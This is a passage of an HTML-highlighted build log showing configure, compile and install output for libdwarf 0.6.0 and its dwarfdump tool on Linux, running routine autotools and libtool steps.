GNU C... <span class="hljs-built_in">yes</span><br>checking whether gcc accepts -g... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> gcc option to <span class="hljs-built_in">enable</span> C11 features... none needed<br>checking whether gcc understands -c and -o together... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> ar... ar<br>checking the archiver (ar) interface... ar<br>checking <span class="hljs-keyword">for</span> a BSD-compatible install... /usr/bin/install -c<br>checking whether build environment is sane... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> a race-free <span class="hljs-built_in">mkdir</span> -p... /bin/mkdir -p<br>checking <span class="hljs-keyword">for</span> gawk... gawk<br>checking whether make sets $(MAKE)... <span class="hljs-built_in">yes</span><br>checking whether make supports the include directive... <span class="hljs-built_in">yes</span> (GNU style)<br>checking whether make supports nested variables... <span class="hljs-built_in">yes</span><br>checking dependency style of gcc... gcc3<br>checking whether make supports nested variables... (cached) <span class="hljs-built_in">yes</span><br>checking how to <span class="hljs-built_in">print</span> strings... <span class="hljs-built_in">printf</span><br>checking <span class="hljs-keyword">for</span> a sed that does not <span class="hljs-built_in">truncate</span> output... /bin/sed<br>checking <span class="hljs-keyword">for</span> grep that handles long lines and -e... /bin/grep<br>checking <span class="hljs-keyword">for</span> egrep... /bin/grep -E<br>checking <span class="hljs-keyword">for</span> fgrep... /bin/grep -F<br>checking <span class="hljs-keyword">for</span> ld used by gcc... /usr/bin/ld<br>checking <span class="hljs-keyword">if</span> the linker (/usr/bin/ld) is GNU ld... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> BSD- or MS-compatible name lister (nm)... /usr/bin/nm -B<br>checking the name lister (/usr/bin/nm -B) interface... BSD nm<br>checking whether <span class="hljs-built_in">ln</span> -s works... <span class="hljs-built_in">yes</span><br>checking the maximum length of <span class="hljs-built_in">command</span> line arguments... 1572864<br>checking how to convert x86_64-pc-linux-gnu file names to x86_64-pc-linux-gnu format... func_convert_file_noop<br>checking how to convert x86_64-pc-linux-gnu file names to toolchain format... func_convert_file_noop<br>checking <span class="hljs-keyword">for</span> /usr/bin/ld option to reload object files... -r<br>checking <span class="hljs-keyword">for</span> objdump... objdump<br>checking how to recognize dependent libraries... pass_all<br>checking <span class="hljs-keyword">for</span> dlltool... no<br>checking how to associate runtime and <span class="hljs-built_in">link</span> libraries... <span class="hljs-built_in">printf</span> %s\n<br>checking <span class="hljs-keyword">for</span> archiver @FILE support... @<br>checking <span class="hljs-keyword">for</span> strip... strip<br>checking <span class="hljs-keyword">for</span> ranlib... ranlib<br>checking <span class="hljs-built_in">command</span> to parse /usr/bin/nm -B output from gcc object... ok<br>checking <span class="hljs-keyword">for</span> sysroot... no<br>checking <span class="hljs-keyword">for</span> a working <span class="hljs-built_in">dd</span>... /bin/dd<br>checking how to <span class="hljs-built_in">truncate</span> binary pipes... /bin/dd bs=4096 count=1<br>../configure: line 7994: /usr/bin/file: No such file or directory<br>checking <span class="hljs-keyword">for</span> mt... mt<br>checking <span class="hljs-keyword">if</span> mt is a manifest tool... no<br>checking <span class="hljs-keyword">for</span> stdio.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> stdlib.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> string.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> inttypes.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> stdint.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> strings.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> sys/stat.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> sys/types.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> unistd.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> dlfcn.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> objdir... .libs<br>checking <span class="hljs-keyword">if</span> gcc supports -fno-rtti -fno-exceptions... no<br>checking <span class="hljs-keyword">for</span> gcc option to produce PIC... -fPIC -DPIC<br>checking <span class="hljs-keyword">if</span> gcc PIC flag -fPIC -DPIC works... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">if</span> gcc static flag -static works... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">if</span> gcc supports -c -o file.o... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">if</span> gcc supports -c -o file.o... (cached) <span class="hljs-built_in">yes</span><br>checking whether the gcc linker (/usr/bin/ld) supports shared libraries... <span class="hljs-built_in">yes</span><br>checking dynamic linker characteristics... GNU/Linux ld.so<br>checking how to hardcode library paths into programs... immediate<br>checking whether stripping libraries is possible... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">if</span> libtool supports shared libraries... <span class="hljs-built_in">yes</span><br>checking whether to build shared libraries... no<br>checking whether to build static libraries... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> gcc... (cached) gcc<br>checking whether the compiler supports GNU C... (cached) <span class="hljs-built_in">yes</span><br>checking whether gcc accepts -g... (cached) <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> gcc option to <span class="hljs-built_in">enable</span> C11 features... (cached) none needed<br>checking whether gcc understands -c and -o together... (cached) <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> g++... no<br>checking <span class="hljs-keyword">for</span> c++... no<br>checking <span class="hljs-keyword">for</span> gpp... no<br>checking <span class="hljs-keyword">for</span> aCC... no<br>checking <span class="hljs-keyword">for</span> CC... no<br>checking <span class="hljs-keyword">for</span> cxx... no<br>checking <span class="hljs-keyword">for</span> cc++... no<br>checking <span class="hljs-keyword">for</span> cl.exe... no<br>checking <span class="hljs-keyword">for</span> FCC... no<br>checking <span class="hljs-keyword">for</span> KCC... no<br>checking <span class="hljs-keyword">for</span> RCC... no<br>checking <span class="hljs-keyword">for</span> xlC_r... no<br>checking <span class="hljs-keyword">for</span> xlC... no<br>checking <span class="hljs-keyword">for</span> clang++... no<br>checking whether the compiler supports GNU C++... no<br>checking whether g++ accepts -g... no<br>checking <span class="hljs-keyword">for</span> g++ option to <span class="hljs-built_in">enable</span> C++11 features... none needed<br>checking dependency style of g++... none<br>checking whether gcc and cc understand -c and -o together... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> pkg-config... /usr/bin/pkg-config<br>checking pkg-config is at least version 0.9.0... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> ZLIB... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> ZSTD... no<br>checking <span class="hljs-keyword">for</span> unistd.h... (cached) <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> sys/types.h... (cached) <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> malloc.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> stdint.h... (cached) <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> inttypes.h... (cached) <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> stddef.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> fcntl.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> zstd.h... no<br>checking <span class="hljs-keyword">for</span> uintptr_t... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> intptr_t... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> uint32_t... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> libelf.h... no<br>checking <span class="hljs-keyword">for</span> libelf/libelf.h... no<br>checking <span class="hljs-keyword">for</span> elf.h... <span class="hljs-built_in">yes</span><br>configure: <span class="hljs-string">&quot;no libelf headers, so no libelf&quot;</span><br>checking whether byte ordering is bigendian... no<br>checking whether the C++ compiler supports ... no<br>checking whether the C++ compiler supports ... no<br>checking whether the C compiler supports ... <span class="hljs-built_in">yes</span><br>checking whether <span class="hljs-string">&quot;unused&quot;</span> attribute is available... <span class="hljs-built_in">yes</span><br>checking whether sanitize options are used... no<br>checking <span class="hljs-keyword">for</span> size_t... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> working alloca.h... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> alloca... <span class="hljs-built_in">yes</span><br>checking <span class="hljs-keyword">for</span> library containing elf64_getehdr... no<br>checking <span class="hljs-keyword">for</span> library containing elf64_getshdr... no<br>dadebug zlib <span class="hljs-built_in">yes</span> <span class="hljs-built_in">yes</span><br>dadebug zstd no no<br>checking that generated files are newer than configure... <span class="hljs-keyword">done</span><br>configure: creating ./config.status<br>config.status: creating Makefile<br>config.status: creating src/lib/libdwarf/Makefile<br>config.status: creating src/lib/libdwarfp/Makefile<br>config.status: creating src/bin/dwarfdump/Makefile<br>config.status: creating src/bin/dwarfgen/Makefile<br>config.status: creating src/bin/dwarfexample/Makefile<br>config.status: creating src/bin/gennames/Makefile<br>config.status: creating src/bin/tag_attr/Makefile<br>config.status: creating src/bin/tag_tree/Makefile<br>config.status: creating src/bin/attr_form/Makefile<br>config.status: creating src/bin/buildopstab/Makefile<br>config.status: creating src/bin/builduritable/Makefile<br>config.status: creating <span class="hljs-built_in">test</span>/Makefile<br>config.status: creating doc/Makefile<br>config.status: creating libdwarf.pc<br>config.status: creating libdwarfp.pc<br>config.status: creating config.h<br>config.status: executing depfiles commands<br>config.status: executing libtool commands<br><br>libdwarf 0.6.0<br><br>Configuration Options Summary:<br><br>  BuildOS..............: linux-gnu<br>  HostOS...............: linux-gnu<br><br>  shared library.......: no<br>  static library.......: <span class="hljs-built_in">yes</span><br><br>  zlib support.........: <span class="hljs-built_in">yes</span><br>  zstd support.........: no<br>  sanitize support.....: no<br>  documentation........: no<br>  BuildOS-BigEndian....: no<br><br>  libdwarf.............: always<br>    elf64_getehdr......: no<br>    elf64_getshdr......: no<br>    libelf.............: no<br>  dwarfdump............: always<br>  dwarfgen.............: no<br>  dwarfexample.........: no<br><br>Compilation............: make (or gmake)<br>  CPPFLAGS.............: <br>  CFLAGS...............: -g -O2 <br>  LDFLAGS..............: <br>  LIBS.................: <br>  ZLIB_LIBS............: -lz<br>  ZSTD_LIBS............: <br>  DWARF_CFLAGS.........: <br>  DWARF_LIBS...........: <br>  DWARFGEN_LIBS........: <br><br>Installation...........: make install (as root <span class="hljs-keyword">if</span> needed, with <span class="hljs-string">&#x27;su&#x27;</span> or <span class="hljs-string">&#x27;sudo&#x27;</span>)<br>  prefix...............: /usr/local<br><br>make  all-recursive<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/lib/libdwarf<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/lib/libdwarf&#x27;</span><br>  CC       libdwarf_la-dwarf_abbrev.lo<br>  CC       libdwarf_la-dwarf_alloc.lo<br>  CC       libdwarf_la-dwarf_arange.lo<br>  CC       libdwarf_la-dwarf_fill_in_attr_form.lo<br>  CC       libdwarf_la-dwarf_dsc.lo<br>  CC       libdwarf_la-dwarf_debuglink.lo<br>  CC       libdwarf_la-dwarf_error.lo<br>  CC       libdwarf_la-dwarf_crc.lo<br>  CC       libdwarf_la-dwarf_elf_rel_detector.lo<br>  CC       libdwarf_la-dwarf_debug_sup.lo<br>  CC       libdwarf_la-dwarf_debugnames.lo<br>  CC       libdwarf_la-dwarf_elf_load_headers.lo<br>  CC       libdwarf_la-dwarf_crc32.lo<br>  CC       libdwarf_la-dwarf_die_deliv.lo<br>  CC       libdwarf_la-dwarf_debugaddr.lo<br>  CC       libdwarf_la-dwarf_elfread.lo<br>  CC       libdwarf_la-dwarf_find_sigref.lo<br>  CC       libdwarf_la-dwarf_fission_to_cu.lo<br>  CC       libdwarf_la-dwarf_form.lo<br>  CC       libdwarf_la-dwarf_form_class_names.lo<br>  CC       libdwarf_la-dwarf_frame.lo<br>  CC       libdwarf_la-dwarf_frame2.lo<br>  CC       libdwarf_la-dwarf_gdbindex.lo<br>  CC       libdwarf_la-dwarf_generic_init.lo<br>  CC       libdwarf_la-dwarf_global.lo<br>  CC       libdwarf_la-dwarf_gnu_index.lo<br>  CC       libdwarf_la-dwarf_groups.lo<br>  CC       libdwarf_la-dwarf_harmless.lo<br>  CC       libdwarf_la-dwarf_init_finish.lo<br>  CC       libdwarf_la-dwarf_leb.lo<br>  CC       libdwarf_la-dwarf_line.lo<br>  CC       libdwarf_la-dwarf_loc.lo<br>  CC       libdwarf_la-dwarf_locationop_read.lo<br>  CC       libdwarf_la-dwarf_loclists.lo<br>  CC       libdwarf_la-dwarf_machoread.lo<br>  CC       libdwarf_la-dwarf_macro.lo<br>  CC       libdwarf_la-dwarf_macro5.lo<br>  CC       libdwarf_la-dwarf_memcpy_swap.lo<br>  CC       libdwarf_la-dwarf_names.lo<br>  CC       libdwarf_la-dwarf_object_detector.lo<br>  CC       libdwarf_la-dwarf_object_read_common.lo<br>  CC       libdwarf_la-dwarf_peread.lo<br>  CC       libdwarf_la-dwarf_print_lines.lo<br>  CC       libdwarf_la-dwarf_query.lo<br>  CC       libdwarf_la-dwarf_safe_strcpy.lo<br>  CC       libdwarf_la-dwarf_ranges.lo<br>  CC       libdwarf_la-dwarf_str_offsets.lo<br>  CC       libdwarf_la-dwarf_rnglists.lo<br>  CC       libdwarf_la-dwarf_string.lo<br>  CC       libdwarf_la-dwarf_stringsection.lo<br>  CC       libdwarf_la-dwarf_tied.lo<br>  CC       libdwarf_la-dwarf_tsearchhash.lo<br>  CC       libdwarf_la-dwarf_util.lo<br>  CC       libdwarf_la-dwarf_xu_index.lo<br>  CCLD     libdwarf.la<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/lib/libdwarf&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/bin/dwarfdump<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/dwarfdump&#x27;</span><br>  CC       dwarfdump-dd_command_options.o<br>  CC       dwarfdump-dwarfdump.o<br>  CC       dwarfdump-dd_attr_form.o<br>  CC       dwarfdump-dd_addrmap.o<br>  CC       dwarfdump-dd_canonical_append.o<br>  CC       dwarfdump-dd_common.o<br>  CC       dwarfdump-dd_safe_strcpy.o<br>  CC       dwarfdump-dd_getopt.o<br>  CC       dwarfdump-dd_glflags.o<br>  CC       dwarfdump-dd_checkutil.o<br>  CC       dwarfdump-dd_tsearchbal.o<br>  CC       dwarfdump-dd_compiler_info.o<br>  CC       dwarfdump-dd_esb.o<br>  CC       dwarfdump-dd_regex.o<br>  CC       dwarfdump-dd_helpertree.o<br>  CC       dwarfdump-dd_dwconf.o<br>  CC       dwarfdump-dd_macrocheck.o<br>  CC       dwarfdump-dd_naming.o<br>  CC       dwarfdump-dd_makename.o<br>  CC       dwarfdump-dd_opscounttab.o<br>  CC       dwarfdump-print_abbrevs.o<br>  CC       dwarfdump-print_aranges.o<br>  CC       dwarfdump-print_debugfission.o<br>  CC       dwarfdump-print_die.o<br>  CC       dwarfdump-print_debug_gnu.o<br>  CC       dwarfdump-print_debug_addr.o<br>  CC       dwarfdump-print_debug_names.o<br>  CC       dwarfdump-print_debug_sup.o<br>  CC       dwarfdump-print_frames.o<br>  CC       dwarfdump-print_gdbindex.o<br>  CC       dwarfdump-print_hipc_lopc_attr.o<br>  CC       dwarfdump-print_lines.o<br>  CC       dwarfdump-print_llex_codes.o<br>  CC       dwarfdump-print_origloclist_codes.o<br>  CC       dwarfdump-print_loclists.o<br>  CC       dwarfdump-print_loclists_codes.o<br>  CC       dwarfdump-print_macinfo.o<br>  CC       dwarfdump-print_macro.o<br>  CC       dwarfdump-print_pubnames.o<br>  CC       dwarfdump-print_rnglists.o<br>  CC       dwarfdump-print_section_groups.o<br>  CC       dwarfdump-print_ranges.o<br>  CC       dwarfdump-print_sections.o<br>  CC       dwarfdump-print_str_offsets.o<br>  CC       dwarfdump-print_strings.o<br>  CC       dwarfdump-print_tag_attributes_usage.o<br>  CC       dwarfdump-dd_sanitized.o<br>  CC       dwarfdump-dd_strstrnocase.o<br>  CC       dwarfdump-dd_true_section_name.o<br>  CC       dwarfdump-dd_uri.o<br>  CCLD     dwarfdump<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/dwarfdump&#x27;</span><br>Making all <span class="hljs-keyword">in</span> <span class="hljs-built_in">test</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/test&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;all&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/test&#x27;</span><br>Making all <span class="hljs-keyword">in</span> doc<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/doc&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;all&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/doc&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/bin/gennames<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/gennames&#x27;</span><br>  CC       gennames-gennames.o<br>  CC       ../../../src/bin/dwarfdump/gennames-dd_getopt.o<br>  CC       ../../../src/lib/libdwarf/gennames-dwarf_safe_strcpy.o<br>  CCLD     gennames<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/gennames&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/bin/tag_tree<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_tree&#x27;</span><br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_common.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_esb.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_makename.o<br>  CC       tagtree-tag_tree.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_getopt.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_tsearchbal.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_glflags.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_naming.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_sanitized.o<br>  CC       ../../../src/bin/dwarfdump/tagtree-dd_safe_strcpy.o<br>  CC       ../../../src/bin/tag_tree/tagtree-tag_common.o<br>  CCLD     tagtree<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_tree&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/bin/tag_attr<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_attr&#x27;</span><br>  CC       ../../../src/bin/tag_tree/tagattr-tag_common.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_safe_strcpy.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_makename.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_sanitized.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_common.o<br>  CC       tagattr-tag_attr.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_esb.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_glflags.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_tsearchbal.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_getopt.o<br>  CC       ../../../src/bin/dwarfdump/tagattr-dd_naming.o<br>  CCLD     tagattr<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_attr&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/bin/attr_form<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/attr_form&#x27;</span><br>  CC       attrform-attr_form_build.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_common.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_esb.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_tsearchbal.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_glflags.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_attr_form.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_naming.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_makename.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_getopt.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_safe_strcpy.o<br>  CC       ../../../src/bin/dwarfdump/attrform-dd_sanitized.o<br>  CC       ../../../src/bin/tag_tree/attrform-tag_common.o<br>  CCLD     attrform<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/attr_form&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/bin/buildopstab<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/buildopstab&#x27;</span><br>  CC       buildopstab-buildopscounttab.o<br>  CCLD     buildopstab<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/buildopstab&#x27;</span><br>Making all <span class="hljs-keyword">in</span> src/bin/builduritable<br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/builduritable&#x27;</span><br>  CC       builduritable-uritablebuild.o<br>  CCLD     builduritable<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/builduritable&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/lib/libdwarf<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/lib/libdwarf&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/lib/libdwarf&#x27;</span><br> /bin/mkdir -p <span class="hljs-string">&#x27;/usr/local/lib&#x27;</span><br> /bin/bash ../../../libtool   --mode=install /usr/bin/install -c   libdwarf.la <span class="hljs-string">&#x27;/usr/local/lib&#x27;</span><br>libtool: install: /usr/bin/install -c .libs/libdwarf.lai /usr/local/lib/libdwarf.la<br>libtool: install: /usr/bin/install -c .libs/libdwarf.a /usr/local/lib/libdwarf.a<br>libtool: install: <span class="hljs-built_in">chmod</span> 644 /usr/local/lib/libdwarf.a<br>libtool: install: ranlib /usr/local/lib/libdwarf.a<br>libtool: finish: PATH=<span class="hljs-string">&quot;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/sbin&quot;</span> ldconfig -n /usr/local/lib<br>----------------------------------------------------------------------<br>Libraries have been installed <span class="hljs-keyword">in</span>:<br>   /usr/local/lib<br><br>If you ever happen to want to <span class="hljs-built_in">link</span> against installed libraries<br><span class="hljs-keyword">in</span> a given directory, LIBDIR, you must either use libtool, and<br>specify the full pathname of the library, or use the <span class="hljs-string">&#x27;-LLIBDIR&#x27;</span><br>flag during linking and <span class="hljs-keyword">do</span> at least one of the following:<br>   - add LIBDIR to the <span class="hljs-string">&#x27;LD_LIBRARY_PATH&#x27;</span> environment variable<br>     during execution<br>   - add LIBDIR to the <span class="hljs-string">&#x27;LD_RUN_PATH&#x27;</span> environment variable<br>     during linking<br>   - use the <span class="hljs-string">&#x27;-Wl,-rpath -Wl,LIBDIR&#x27;</span> linker flag<br>   - have your system administrator add LIBDIR to <span class="hljs-string">&#x27;/etc/ld.so.conf&#x27;</span><br><br>See any operating system documentation about shared libraries <span class="hljs-keyword">for</span><br>more information, such as the ld(1) and ld.so(8) manual pages.<br>----------------------------------------------------------------------<br> /bin/mkdir -p <span class="hljs-string">&#x27;/usr/local/include/libdwarf-0&#x27;</span><br> /usr/bin/install -c -m 644 ../../../../src/lib/libdwarf/dwarf.h ../../../../src/lib/libdwarf/libdwarf.h <span class="hljs-string">&#x27;/usr/local/include/libdwarf-0&#x27;</span><br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/lib/libdwarf&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/lib/libdwarf&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/bin/dwarfdump<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/dwarfdump&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/dwarfdump&#x27;</span><br> /bin/mkdir -p <span class="hljs-string">&#x27;/usr/local/bin&#x27;</span><br>  /bin/bash ../../../libtool   --mode=install /usr/bin/install -c dwarfdump <span class="hljs-string">&#x27;/usr/local/bin&#x27;</span><br>libtool: install: /usr/bin/install -c dwarfdump /usr/local/bin/dwarfdump<br> /bin/mkdir -p <span class="hljs-string">&#x27;/usr/local/share/dwarfdump&#x27;</span><br> /usr/bin/install -c -m 644 ../../../../src/bin/dwarfdump/dwarfdump.conf <span class="hljs-string">&#x27;/usr/local/share/dwarfdump&#x27;</span><br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/dwarfdump&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/dwarfdump&#x27;</span><br>Making install <span class="hljs-keyword">in</span> <span class="hljs-built_in">test</span><br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/test&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/test&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-data-am&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/test&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/test&#x27;</span><br>Making install <span class="hljs-keyword">in</span> doc<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/doc&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/doc&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br> /bin/mkdir -p <span class="hljs-string">&#x27;/usr/local/share/man/man1&#x27;</span><br> /usr/bin/install -c -m 644 ../../doc/dwarfdump.1 <span class="hljs-string">&#x27;/usr/local/share/man/man1&#x27;</span><br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/doc&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/doc&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/bin/gennames<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/gennames&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/gennames&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-data-am&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/gennames&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/gennames&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/bin/tag_tree<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_tree&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_tree&#x27;</span><br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-exec-am&#x27;</span>.<br>make[2]: Nothing to be <span class="hljs-keyword">done</span> <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;install-data-am&#x27;</span>.<br>make[2]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_tree&#x27;</span><br>make[1]: Leaving directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_tree&#x27;</span><br>Making install <span class="hljs-keyword">in</span> src/bin/tag_attr<br>make[1]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_attr&#x27;</span><br>make[2]: Entering directory <span class="hljs-string">&#x27;/root/libdwarf-0.6.0/build/src/bin/tag_attr&#x27;</span><br>make[2]: 